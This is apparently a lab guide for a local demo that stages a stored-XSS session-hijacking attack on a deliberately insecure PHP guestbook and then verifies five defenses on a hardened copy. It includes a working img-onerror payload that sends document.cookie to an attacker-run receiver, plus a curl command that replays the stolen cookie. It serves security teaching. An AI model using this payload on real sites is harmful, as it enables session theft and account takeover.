# 🎯 Attack Simulation Guide — Step by Step

This guide walks you through running the **session hijacking attack** against
the vulnerable app, then proving the **defenses** stop it. All code already
lives in this `demo-environment/` folder.

> ⚠️ **Run only on your own machine or an isolated VM with authorization.**
> Never point these payloads at systems you do not own.

**Requirements:** PHP 7.4+ only. Check with `php -v`. No database needed.

---

## 0. Folder map

```
demo-environment/
├── vulnerable-app/index.php       The target (insecure guestbook)
├── attacker/cookiecatcher.php     Cookie capture server + dashboard
├── attacker/xss-payloads.txt      Copy-paste payloads
├── secure-app/                    Hardened version (all 5 defenses)
└── defenses/                      Standalone defense examples
```

---

## 1. Start the three servers

Open **three terminals** (one per server). Run each from the
`demo-environment/` directory:

**Terminal 1 — Vulnerable app (the target)**
```bash
php -S 0.0.0.0:8001 -t vulnerable-app
```

**Terminal 2 — Secure app (for the defense test)**
```bash
php -S 0.0.0.0:8002 -t secure-app
```

**Terminal 3 — CookieCatcher (the attacker's receiver)**
```bash
php -S 0.0.0.0:8080 -t attacker attacker/cookiecatcher.php
```

> One-command alternative: `bash setup/setup.sh` starts all three at once.

Find your machine's IP (you'll need it for the payload):
```bash
hostname -I        # Linux
ipconfig           # Windows (look for IPv4 Address)
```
Example IP used below: `192.168.1.10`

---

## 2. Confirm the target is vulnerable

1. Browse to **http://localhost:8001**
2. You're shown a guestbook, "logged in" as `demo_victim`, with a visible
   `PHPSESSID`. This is the session we will steal.
3. Open DevTools (F12) → Console → type:
   ```js
   document.cookie
   ```
   You can read `PHPSESSID=...` → the cookie is **not** HttpOnly → stealable.

---

## 3. Inject the XSS payload (the attack)

In the comment box on **http://localhost:8001**, paste this — replacing
`192.168.1.10` with **your** IP from step 1:

```html
<img src=x onerror="this.src='http://192.168.1.10:8080/?c='+document.cookie">
```

Click **Submit**, then **reload the page** so the stored payload executes.

**What happens under the hood:**
1. The browser tries to load image `src=x`, fails, and fires `onerror`.
2. `onerror` runs JS that sends `document.cookie` to the CookieCatcher.
3. CookieCatcher logs the victim's session cookie.

---

## 4. View the stolen cookie

Open the **CookieCatcher dashboard**: **http://localhost:8080**

You'll see an entry like:
```
[2024-01-15 14:45:03] IP 192.168.1.20
UA: Mozilla/5.0 ... Chrome/120.0
COOKIE: PHPSESSID=abc123xyz789; user_id=12345
```

The terminal running CookieCatcher also prints:
```
=== COOKIE CAPTURED ===
TIME        : 2024-01-15 14:45:03
SOURCE_IP   : 192.168.1.20
COOKIE      : PHPSESSID=abc123xyz789; user_id=12345
=======================
```

✅ **Attack successful** — you now hold the victim's session token.

---

## 5. Use the stolen cookie (session hijack)

**Option A — Browser DevTools**
1. Open a fresh browser/profile, go to http://localhost:8001
2. DevTools → Application → Cookies → http://localhost:8001
3. Set `PHPSESSID` to the stolen value, refresh.
4. You are now acting as the victim — no password required.

**Option B — cURL**
```bash
curl -b "PHPSESSID=abc123xyz789" http://localhost:8001
```

---

## 6. Prove the defenses stop it (secure app)

Repeat steps 2–4, but use the **secure app** at **http://localhost:8002**:

1. `document.cookie` in the console **no longer shows** the session cookie
   → **Defense #1 (HttpOnly)**.
2. Submitting the payload returns **403 Forbidden**
   → **Defense #4 (WAF filter)**.
3. If a payload is stored, it renders as **plain text**, not executed
   → **Defense #3 (output encoding)**.
4. Inline scripts are refused by the browser console
   → **Defense #2 (CSP)**.
5. Even a stolen cookie replayed from another IP/User-Agent is rejected
   → **Defense #5 (session binding)**.
6. Check http://localhost:8080 — **no new capture appears.**

✅ **Attack blocked at every layer.**

---

## 7. Record results for your report

| Trial | Target            | Payload                | Result          |
|-------|-------------------|------------------------|-----------------|
| 1     | Vulnerable :8001  | `<img onerror=...>`    | ✅ Cookie stolen |
| 2     | Secure :8002      | same payload           | ❌ Blocked (403) |
| 3     | Secure :8002      | replay stolen cookie   | ❌ 403 (IP bind) |

Take screenshots of:
- The vulnerable page + `document.cookie` showing the session
- The CookieCatcher dashboard with the captured cookie
- The secure app returning 403 / rendering payload as text
- An empty CookieCatcher after attacking the secure app

---

## 8. Reset between runs

Delete the demo state files to start fresh:
```bash
rm -f vulnerable-app/comments.txt \
      secure-app/comments.txt \
      attacker/captured_cookies.log
```

---

## Troubleshooting

- **No cookie captured?** Use your real LAN IP in the payload (not
  `localhost`), and confirm port 8080 is reachable.
- **Secure app won't set a cookie over HTTP?** It calls
  `SecureSession::start(false)` to allow the demo without HTTPS; set it to
  `true` in production.
- **Port in use?** Pick another port in the `php -S` command.
